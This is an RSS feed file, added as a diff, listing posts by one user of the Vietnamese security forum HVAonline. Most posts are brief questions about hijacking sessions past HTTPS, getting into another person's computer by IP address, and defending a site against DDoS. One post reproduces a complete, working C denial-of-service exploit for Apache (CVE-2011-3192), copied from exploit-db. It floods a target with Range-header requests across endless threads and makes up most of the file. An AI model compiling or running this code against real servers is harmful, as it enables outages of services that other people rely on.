@@ -1,0 +1,244 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+	<channel>
+		<title><![CDATA[Messages posted by "tuyenhva"]]></title>
+		<link>http://www.hvaonline.net/hvaonline/posts/listByUser/224188.hva</link>
+		<description><![CDATA[Messages posted by "tuyenhva"]]></description>
+		<generator>JForum - http://www.jforum.net</generator>
+			<item>
+				<title>Hack account Facebook, Gmail, Yahoo bằng HTTP Session Sidejacking</title>
+				<description><![CDATA[ @xnohat: có thể nêu một số gợi ý để vượt qua https được không :)]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/40470/261691.hva#261691</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/preList/40470/261691.hva#261691</link>
+				<pubDate><![CDATA[Wed, 18 Apr 2012 22:38:27]]> GMT</pubDate>
+				<author><![CDATA[ tuyenhva]]></author>
+			</item>
+			<item>
+				<title>Apache HTTP DoS</title>
+				<description><![CDATA[ 1 code dos vào Apache  mới trên exploit-db.com
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>/*
+ * This is a reverse engineered version of the exploit for CVE-2011-3192 made
+ * by ev1lut10n &#40;http://jayakonstruksi.com/backupintsec/rapache.tgz&#41;.
+ * Copyright 2011 Ramon de C Valle &lt;rcvalle@redhat.com&gt;
+ *
+ * Compile with the following command:
+ * gcc -Wall -pthread -o rcvalle-rapache rcvalle-rapache.c
+ */
+ 
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/ptrace.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;netdb.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;pthread.h&gt;
+ 
+void ptrace_trap&#40;void&#41; __attribute__ &#40;&#40;constructor&#41;&#41;;
+ 
+void
+ptrace_trap&#40;void&#41; {
+    if &#40;ptrace&#40;PTRACE_TRACEME, 0, 0, 0&#41; &lt; 0&#41; {
+        write&#40;fileno&#40;stdout&#41;, &quot;Segmentation fault\n&quot;, 19&#41;;
+        exit&#40;-1&#41;;
+    }
+}
+ 
+void
+w4rn41dun14mu&#40;int attr, int fg, int bg&#41;
+{
+    char command&#91;13&#93;;
+ 
+    sprintf&#40;command, &quot;%c&#91;%d;%d;%dm&quot;, 0x1b, attr, fg+30, bg+40&#41;;
+    printf&#40;&quot;%s&quot;, command&#41;;
+}
+ 
+void
+banner&#40;&#41;
+{
+    w4rn41dun14mu&#40;0, 1, 0&#41;;
+    fwrite&#40;&quot;Remote Apache Denial of Service Exploit by ev1lut10n\n&quot;, 53, 1,
+           stdout&#41;;
+}
+ 
+void
+gime_er_mas&#40;&#41;
+{
+    printf&#40;&quot;%c%s&quot;, 0x1b, &quot;&#91;2J&quot;&#41;;
+    printf&#40;&quot;%c%s&quot;, 0x1b, &quot;&#91;1;1H&quot;&#41;;
+    puts&#40;&quot;\nsorry dude there's an error...&quot;&#41;;
+}
+ 
+struct thread_info {
+    pthread_t thread_id;
+    int       thread_num;
+    char     *argv_string;
+};
+ 
+static void *
+thread_start&#40;void *arg&#41;
+{
+    struct thread_info *tinfo = &#40;struct thread_info *&#41; arg;
+    char hostname&#91;64&#93;;
+    int j;
+ 
+    strcpy&#40;hostname, tinfo-&gt;argv_string&#41;;
+ 
+    j = 0;
+    while &#40;j != 10&#41; {
+        struct addrinfo hints;
+        struct addrinfo *result, *rp;
+        int sfd, s;
+        ssize_t nwritten;
+ 
+        memset&#40;&hints, 0, sizeof&#40;struct addrinfo&#41;&#41;;
+        hints.ai_family = AF_UNSPEC;
+        hints.ai_socktype = SOCK_STREAM;
+        hints.ai_flags = 0;
+        hints.ai_protocol = 0;
+ 
+        s = getaddrinfo&#40;hostname, &quot;http&quot;, &hints, &result&#41;;
+        if &#40;s != 0&#41; {
+            fprintf&#40;stderr, &quot;getaddrinfo: %s\n&quot;, gai_strerror&#40;s&#41;&#41;;
+            exit&#40;EXIT_FAILURE&#41;;
+        }
+ 
+        for &#40;rp = result; rp != NULL; rp = rp-&gt;ai_next&#41; {
+            sfd = socket&#40;rp-&gt;ai_family, rp-&gt;ai_socktype, rp-&gt;ai_protocol&#41;;
+            if &#40;sfd == -1&#41;
+                continue;
+ 
+            if &#40;connect&#40;sfd, rp-&gt;ai_addr, rp-&gt;ai_addrlen&#41; == -1&#41;
+                close&#40;sfd&#41;;
+        }
+ 
+        if &#40;result != NULL&#41;
+            freeaddrinfo&#40;result&#41;;
+ 
+        nwritten = write&#40;sfd, &quot;HEAD / HTTP/1.1\n&quot;
+                              &quot;Host:localhost\n&quot;
+                              &quot;Range:bytes=0-,0-\n&quot;
+                              &quot;Accept-Encoding: gzip&quot;, 71&#41;;
+        if &#40;nwritten == -1&#41;
+            close&#40;sfd&#41;;
+ 
+        usleep&#40;300000&#41;;
+ 
+        j++;
+    }
+ 
+    return 0;
+}
+ 
+int
+main&#40;int argc, char *argv&#91;&#93;&#41;
+{
+    int i;
+    struct thread_info tinfo;
+ 
+    banner&#40;&#41;;
+ 
+    if &#40;argc &lt;= 1&#41; {
+        w4rn41dun14mu&#40;0, 2, 0&#41;;
+        fwrite&#40;&quot;\n&#91;-&#93; Usage : ./rapache hostname\n&quot;, 32, 1, stdout&#41;;
+        return 0;
+    }
+ 
+    w4rn41dun14mu&#40;0, 3, 0&#41;;
+    printf&#40;&quot;&#91;+&#93; Attacking %s please wait  in minutes ...\n&quot;, argv&#91;1&#93;&#41;;
+ 
+    while &#40;1&#41; {
+        i = 0;
+        while &#40;i != 50&#41; {
+            tinfo.thread_num = i;
+            tinfo.argv_string = argv&#91;1&#93;;
+ 
+            pthread_create&#40;&tinfo.thread_id, NULL, &thread_start, &tinfo&#41;;
+ 
+            usleep&#40;500000&#41;;
+ 
+            i++;
+        }
+    }
+}</pre>
+		</div>
+<span class="link"> http://www.exploit-db.com/exploits/18225/</span>]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/29851/250961.hva#250961</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/preList/29851/250961.hva#250961</link>
+				<pubDate><![CDATA[Sat, 10 Dec 2011 09:13:24]]> GMT</pubDate>
+				<author><![CDATA[ tuyenhva]]></author>
+			</item>
+			<item>
+				<title>Giúp e về tấn công ddos với các a ơi.</title>
+				<description><![CDATA[ Cám ơn bạn. nhưng mà mình muốn hỏi là sau lần bị tấn công này mình có thể dùng cái gì để có thể ngăn chặn những lần tấn công về sau không.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/35245/216652.hva#216652</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/preList/35245/216652.hva#216652</link>
+				<pubDate><![CDATA[Wed, 28 Jul 2010 09:36:11]]> GMT</pubDate>
+				<author><![CDATA[ tuyenhva]]></author>
+			</item>
+			<item>
+				<title>Giúp e về tấn công ddos với các a ơi.</title>
+				<description><![CDATA[ Trang web của e vừa bị tấn công ddos ai có cách gì hiệu quả để em có thể kiểm tra IP đã tấn công không. Và có ai có cách phòng chống tấn công ddos nào thì chỉ em với.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/35245/216633.hva#216633</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/preList/35245/216633.hva#216633</link>
+				<pubDate><![CDATA[Wed, 28 Jul 2010 07:01:48]]> GMT</pubDate>
+				<author><![CDATA[ tuyenhva]]></author>
+			</item>
+			<item>
+				<title>Có thể xâm nhập vào máy người khác dc không vói cách đơn giản này</title>
+				<description><![CDATA[ kết thúc của vấn đề này là vẫn chưa ai nghĩ ra dc cách vào máy tính khác thông qua địa chỉ ip cả, hoặc có ai đó biết thì lại ko ở trên diễn đàn mình.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/35112/216096.hva#216096</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/preList/35112/216096.hva#216096</link>
+				<pubDate><![CDATA[Thu, 22 Jul 2010 22:24:45]]> GMT</pubDate>
+				<author><![CDATA[ tuyenhva]]></author>
+			</item>
+			<item>
+				<title>Có thể xâm nhập vào máy người khác dc không vói cách đơn giản này</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">tmd wrote:</cite><br>
+		<blockquote><p></p>
+		<cite class="blockquote">tuyenhva wrote:</cite><br>
+		<blockquote><p></p>
+		<cite class="blockquote">tuewru wrote:</cite><br>
+		<blockquote>
+có IP ở đây là IP gì 
+public hay private ?&nbsp;
+		</blockquote>
+Bác có thể giưới thiệu luôn cả 2 trường hơp luôn cho mọi người học hỏi mà.&nbsp;
+		</blockquote>
+Đọc lùi diễn đàn về vài năm trước, có thể thấy vài cái topic tương tự, cần gì phải giới thiệu lại.&nbsp;
+		</blockquote>
+CNTT thay đổi ngày một liệu vài năm trước giờ có dùng dc nữ ko? nếu biết thì post lên cho mọ người học hỏi đi.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/35112/216074.hva#216074</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/preList/35112/216074.hva#216074</link>
+				<pubDate><![CDATA[Thu, 22 Jul 2010 11:07:25]]> GMT</pubDate>
+				<author><![CDATA[ tuyenhva]]></author>
+			</item>
+			<item>
+				<title>Có thể xâm nhập vào máy người khác dc không vói cách đơn giản này</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">tuewru wrote:</cite><br>
+		<blockquote>
+có IP ở đây là IP gì 
+public hay private ?&nbsp;
+		</blockquote>
+Bác có thể giưới thiệu luôn cả 2 trường hơp luôn cho mọi người học hỏi mà.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/35112/216067.hva#216067</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/preList/35112/216067.hva#216067</link>
+				<pubDate><![CDATA[Thu, 22 Jul 2010 09:53:51]]> GMT</pubDate>
+				<author><![CDATA[ tuyenhva]]></author>
+			</item>
+			<item>
+				<title>Có thể xâm nhập vào máy người khác dc không vói cách đơn giản này</title>
+				<description><![CDATA[ vậy mọi người cho e hỏi làm cách nào để vào dc máy người khác khi có địa chỉ ip ko vậy. cách trên e làm nhưng ko dc.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/35112/216014.hva#216014</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/preList/35112/216014.hva#216014</link>
+				<pubDate><![CDATA[Thu, 22 Jul 2010 04:55:16]]> GMT</pubDate>
+				<author><![CDATA[ tuyenhva]]></author>
+			</item>
+	</channel>
+</rss>
